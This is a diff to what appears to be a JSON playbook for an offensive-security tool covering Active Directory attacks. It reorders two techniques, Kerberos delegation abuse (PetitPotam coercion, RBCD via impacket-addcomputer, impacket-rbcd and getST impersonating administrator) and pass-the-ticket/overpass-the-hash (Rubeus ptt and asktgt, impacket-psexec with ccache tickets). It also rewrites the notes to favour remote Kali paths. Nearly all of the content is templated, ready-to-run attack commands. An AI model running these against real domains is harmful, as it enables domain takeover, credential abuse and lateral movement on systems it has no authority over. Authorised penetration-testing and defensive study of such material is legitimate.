@@ -1434,12 +1434,12 @@
       "id": "delegation-abuse",
       "title": "Kerberos Delegation Abuse",
       "hypothesis": "Delegation allows services to act on behalf of users. With unconstrained delegation, a host caches the TGT of everyone who connects, force the DC to connect to it (PetitPotam) and you own the DC's TGT. With constrained delegation or RBCD, abuse write access to set msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate anyone to the target service.",
-      "tool": "rubeus",
+      "tool": "impacket-addcomputer",
       "tools": [
-        "rubeus",
         "impacket-addcomputer",
         "impacket-rbcd",
-        "impacket-getST"
+        "impacket-getST",
+        "rubeus"
       ],
       "os": [
         "windows"
@@ -1466,19 +1466,19 @@
       "refs": [],
       "commands": [
         {
-          "tool": "rubeus",
-          "run": "Rubeus.exe monitor /interval:5 /filteruser:{{dc_account}}",
-          "note": "On an unconstrained-delegation host under your control: watch for the DC's TGT once you have coerced it."
-        },
-        {
           "tool": "impacket-addcomputer",
           "run": "impacket-addcomputer {{domain}}/{{user}}:{{password}} -dc-ip {{target}} -computer-name OBOL$ -computer-pass {{password}}",
-          "note": "RBCD step 1: create a machine account you control (assuming the quota permits). ntlmrelayx --add-computer does the same thing."
+          "note": "PREFERRED remote RBCD path, from Kali. Step 1: create a machine account you control (assuming the quota permits). ntlmrelayx --add-computer does the same thing."
         },
         {
           "tool": "impacket-rbcd",
           "run": "impacket-rbcd -delegate-from OBOL$ -delegate-to {{spn_host}} -action write {{domain}}/{{user}}:{{password}}",
           "note": "RBCD step 2: give your machine delegation rights over the target. Then run getST -spn cifs/target -impersonate administrator."
+        },
+        {
+          "tool": "rubeus",
+          "run": "Rubeus.exe monitor /interval:5 /filteruser:{{dc_account}}",
+          "note": "On-host alternative for the unconstrained-delegation branch: from a host under your control, watch for the DC's TGT once you have coerced it. Needs a session on that host, prefer the remote RBCD path above when the target is RBCD/constrained."
         }
       ]
     },
@@ -2073,10 +2073,10 @@
       "id": "ticket-reuse",
       "title": "Pass-the-Ticket / Overpass-the-Hash",
       "hypothesis": "Stolen or forged Kerberos tickets (.kirbi or ccache) function without knowing any password, you ARE that principal until they expire. On Windows, Rubeus injects tickets into the session; on Linux, aim KRB5CCNAME at the ccache file and impacket -k handles the rest. On top of that, an NTLM hash becomes a TGT through overpass-the-hash (Rubeus asktgt or getTGT with -hashes), giving you Kerberos in a spot where only NTLM was on hand.",
-      "tool": "rubeus",
+      "tool": "impacket-psexec",
       "tools": [
-        "rubeus",
-        "impacket-psexec"
+        "impacket-psexec",
+        "rubeus"
       ],
       "os": [
         "windows",
@@ -2107,19 +2107,19 @@
       ],
       "commands": [
         {
+          "tool": "sh",
+          "run": "export KRB5CCNAME={{file}} && impacket-psexec -k -no-pass {{domain}}/{{user}}@{{target_sam}}.{{domain}}",
+          "note": "PREFERRED, from Kali: point KRB5CCNAME at a ccache ticket and any impacket tool with -k -no-pass reuses it, no session on the box. ticketConverter.py switches kirbi to ccache and back. nxc also accepts the ticket: nxc smb {{target}} -u {{user}} -k --use-kcache."
+        },
+        {
           "tool": "rubeus",
           "run": "Rubeus.exe ptt /ticket:{{file}}",
-          "note": "Windows: inject a .kirbi ticket into your current session (pass-the-ticket). klist verifies it."
+          "note": "On-host (Windows): inject a .kirbi ticket into your current session (pass-the-ticket). klist verifies it. Use this when you already have a session on the box."
         },
         {
           "tool": "rubeus",
           "run": "Rubeus.exe asktgt /user:{{user}} /rc4:{{nthash}} /ptt",
-          "note": "Overpass-the-hash: NTLM hash to TGT, injected straight in."
-        },
-        {
-          "tool": "sh",
-          "run": "export KRB5CCNAME={{file}} && impacket-psexec -k -no-pass {{domain}}/{{user}}@{{target_sam}}.{{domain}}",
-          "note": "Linux: a ccache ticket plus any impacket tool with -k -no-pass. ticketConverter.py switches kirbi to ccache and back."
+          "note": "On-host overpass-the-hash: NTLM hash to TGT, injected straight in. The remote equivalent is impacket-getTGT -hashes :{{nthash}} then the -k reuse above."
         }
       ]
     },
